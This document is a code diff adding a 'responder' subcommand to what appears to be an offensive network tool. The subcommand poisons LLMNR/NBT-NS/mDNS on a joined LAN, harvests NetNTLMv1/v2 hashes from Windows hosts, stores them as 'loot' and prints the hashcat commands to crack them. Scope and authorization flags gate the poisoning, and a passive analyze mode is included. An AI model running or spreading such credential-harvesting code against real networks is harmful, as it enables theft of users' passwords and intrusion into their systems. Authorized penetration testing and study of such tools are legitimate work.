@@ -3049,6 +3049,42 @@ def cmd_authlog(args) -> int:
     return 2
 
 
+def cmd_responder(args) -> int:
+    """Responder-style hash harvesting on the joined LAN — the move the kill-chain
+    JOIN phase sets up. Poison LLMNR/NBT-NS/mDNS so Windows hosts authenticate to
+    us, harvest NetNTLMv1/v2, and drop the hashes into the crack queue. A firing
+    path: FIELD needs the LAN armed + --authorized; LAB runs unleashed; --analyze
+    (passive, no poisoning) is always allowed."""
+    from .netrecon.responder import ResponderHarvest, to_crack_lines
+    rh = ResponderHarvest(args.iface, seconds=getattr(args, "seconds", 60),
+                          analyze_only=getattr(args, "analyze", False))
+    if args.responder_cmd == "plan":
+        print("responder plan — " + ("ANALYZE-only (passive, no poisoning)" if rh.analyze_only
+                                     else "poisons LLMNR / NBT-NS / mDNS on the joined LAN"))
+        print("  " + " ".join(rh.plan()))
+        print("  harvest  : NetNTLMv1 → hashcat -m 5500   |   NetNTLMv2 → hashcat -m 5600")
+        print("  correlate: JOIN (#1) puts us on the LAN → responder → hashes → crack queue")
+        print("  posture  : FIELD needs the LAN armed + --authorized; LAB unleashed; -A always ok")
+        return 0
+    scope = None if getattr(args, "lab", False) else Scope.load(getattr(args, "scope_file", None) or _DEFAULT_SCOPE_PATH)
+    hashes, reason = rh.harvest(scope=scope, authorized=getattr(args, "authorized", False),
+                                lab=getattr(args, "lab", False))
+    print(f"responder {args.iface} — {reason}")
+    if not hashes:
+        return 0
+    grouped = to_crack_lines(hashes)
+    out_dir = getattr(args, "out_dir", None) or "/captures/loot/netntlm"
+    os.makedirs(out_dir, exist_ok=True)
+    for mode, lines in sorted(grouped.items()):
+        path = os.path.join(out_dir, f"netntlm-{mode}.txt")
+        with open(path, "a") as fh:
+            fh.write("\n".join(lines) + "\n")
+        print(f"  {len(lines)} hash(es) -> {path}   (crack: hashcat -m {mode} {path} <wordlist>)")
+    for h in hashes:
+        print(f"    [{h.kind}] {h.username}@{h.domain or '.'}")
+    return 0
+
+
 def cmd_pmkid(args) -> int:
     """Passive PMKID sweep — ZERO-TRANSMIT loot. Harvest the PMKIDs APs volunteer
     on their own (no deauth, no association — nothing sent), then correlate them
@@ -5020,6 +5056,19 @@ def build_parser() -> argparse.ArgumentParser:
     nr.add_argument("--authlog", default=None, help="auth-log path (default: the device auth log)")
     nr.add_argument("--json", action="store_true", help="machine-readable output")
     nr.set_defaults(func=cmd_narrate)
+    rp = sub.add_parser("responder", help="harvest NetNTLM hashes on the joined LAN (LLMNR/NBT-NS/mDNS poisoning) → crack queue")
+    rp.add_argument("iface", help="LAN interface Augur joined (e.g. wlan0)")
+    rpsub = rp.add_subparsers(dest="responder_cmd", required=True)
+    rpp = rpsub.add_parser("plan", help="show the exact command + posture (no run)")
+    rpp.add_argument("--analyze", action="store_true", help="passive: watch, don't answer")
+    rph = rpsub.add_parser("harvest", help="run bounded + parse captured hashes into the crack queue")
+    rph.add_argument("--seconds", type=int, default=60, help="how long to run (time-boxed; default 60)")
+    rph.add_argument("--analyze", action="store_true", help="passive: watch, don't answer (always allowed)")
+    rph.add_argument("--authorized", action="store_true", help="FIELD: actually poison (LAN must be armed in scope)")
+    rph.add_argument("--lab", action="store_true", help="LAB: run unleashed on your own network")
+    rph.add_argument("--scope-file", default=None, help="scope store (FIELD gate)")
+    rph.add_argument("--out-dir", default="/captures/loot/netntlm", help="where to drop harvested hash files")
+    rp.set_defaults(func=cmd_responder)
     pk = sub.add_parser("pmkid", help="passive PMKID sweep — zero-transmit loot (harvest PMKIDs APs leak, correlate to scope/loot/forge)")
     pksub = pk.add_subparsers(dest="pmkid_cmd", required=True)
     pksub.add_parser("plan", help="explain the zero-transmit posture + what it correlates")
